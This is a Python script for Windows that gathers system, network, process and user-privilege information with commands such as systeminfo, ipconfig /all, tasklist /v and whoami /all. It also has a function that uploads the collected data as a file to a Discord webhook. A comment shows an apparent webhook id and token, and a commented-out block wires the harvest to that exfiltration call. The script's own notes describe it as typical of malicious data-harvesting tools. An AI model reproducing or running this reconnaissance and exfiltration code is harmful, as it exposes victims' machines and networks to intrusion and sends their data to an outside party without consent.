def send_file_via_webhook(url, file_path): import urllib.request, json, os, random, string; b='----WebKitFormBoundary'+''.join(random.choices(string.ascii_letters+string.digits,k=16)); c='\r\n'; f=open(file_path,'rb'); d=f.read(); f.close(); n=os.path.basename(file_path); body=(f'--{b}{c}Content-Disposition: form-data; name="file"; filename="{n}"{c}Content-Type: text/plain{c}{c}').encode()+d+c.encode(); p=json.dumps({"content":"Here The Info Logged (Verbose Logging Level):"}); body+=(f'--{b}{c}Content-Disposition: form-data; name="payload_json"{c}{c}{p}{c}').encode(); body+=f'--{b}--{c}'.encode(); h={'Content-Type':f'multipart/form-data; boundary={b}','Content-Length':str(len(body)),'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}; req=urllib.request.Request(url, data=body, headers=h, method='POST'); return urllib.request.urlopen(req).status==204  # hookID (ex.): 1500012080336601198/bd8l7U3MZKMrYuNh6Ttx-zgiMlkTulcg73f-2B9AYxuNTTeGLJ5w8zF7cMcQtsLwj2Ug
import subprocess, platform, os, sys; verbose_info = "\n\n".join([f"=== SYSTEMINFO ===\n{subprocess.run(['systeminfo'], capture_output=True, text=True, encoding='oem').stdout}", f"=== IPCONFIG /ALL ===\n{subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, encoding='oem').stdout}", f"=== TASKLIST (verbose) ===\n{subprocess.run(['tasklist', '/v'], capture_output=True, text=True, encoding='oem').stdout}", f"=== NETSTAT -AN ===\n{subprocess.run(['netstat', '-an'], capture_output=True, text=True, encoding='oem').stdout}", f"=== WHOAMI /ALL ===\n{subprocess.run(['whoami', '/all'], capture_output=True, text=True, encoding='oem').stdout}", f"=== ROUTE PRINT ===\n{subprocess.run(['route', 'print'], capture_output=True, text=True, encoding='oem').stdout}", f"=== ARP -A ===\n{subprocess.run(['arp', '-a'], capture_output=True, text=True, encoding='oem').stdout}", f"=== GETMAC ===\n{subprocess.run(['getmac'], capture_output=True, text=True, encoding='oem').stdout}", f"=== SYSTEM INFO (Python built‑in) ===\nPlatform: {platform.platform()}\nProcessor: {platform.processor()}\nPython version: {sys.version}\nCPU cores: {os.cpu_count()}\nCurrent working dir: {os.getcwd()}\nEnvironment vars count: {len(os.environ)}"]); print("Data captured in 'verbose_info' variable. Length:", len(verbose_info))

# What this does:

# | Command / Section | Purpose                                                                                                              |
# |-------------------|----------------------------------------------------------------------------------------------------------------------|
# | `systeminfo`      | Displays operating system configuration, hardware resources, hotfixes, and boot time.                                |
# | `ipconfig /all`   | Shows full network adapter configuration (IP addresses, MAC, DHCP, DNS, etc.).                                       |
# | `tasklist /v`     | Lists all running processes with verbose details (memory usage, window title, user).                                 |
# | `netstat -an`     | Displays all active network connections and listening ports (numerical addresses).                                   |
# | `whoami /all`     | Shows the current user’s security identifiers (SID), groups, and privileges.                                         |
# | `route print`     | Prints the IPv4/IPv6 routing table.                                                                                  |
# | `arp -a`          | Lists the Address Resolution Protocol (ARP) cache (IP to MAC mappings).                                              |
# | `getmac`          | Displays the MAC addresses of network adapters.                                                                      |
# | Python built‑ins  | Additional info: platform, processor, Python version, CPU count, working directory, number of environment variables. |

# Behavior:

# 1. The script runs **only on Windows** (all commands are Windows‑specific).
# 2. It uses `subprocess.run()` with `capture_output=True`, so command outputs are captured as strings.
# 3. Encoding is set to `'oem'` (console default) to handle special characters.
# 4. All collected data is concatenated with `"\n\n"` separators into a single string variable `verbose_info`.
# 5. The length of `verbose_info` is printed, followed by the entire data.
# 6. Finally, `x = input("")` pauses the script until the user presses Enter (keeps the console window open).

# Security / Privacy Note:

# Running this script will **expose sensitive information**:
# - Network configuration (IPs, MACs, ARP table, routing)
# - Running processes and open ports
# - User privileges and group memberships
# - System hotfixes and security patches

# This is typical of **reconnaissance/inventory** scripts or malicious data‑harvesting tools if run without user consent.

# all data is stored in "verbose_info" for easy use-cases

# ===========================================================================================================================

# code for webhooking via Discord

# print(f"Before write: len={len(verbose_info)}, repr first 50={repr(verbose_info[:50])}")
# with open("verbose_output.txt", "w", encoding="utf-8") as f:
#     bytes_written = f.write(verbose_info)
#     f.flush()
#     print(f"After write: f.write returned {bytes_written}, file size = {os.path.getsize('verbose_output.txt')}")
# print(f"After block: file size = {os.path.getsize('verbose_output.txt')}")

# send_file_via_webhook("https://discord.com/api/webhooks/<WEBHOOK_ID>", "verbose_output.txt")

# ===========================================================================================================================
print(verbose_info);x=input("")
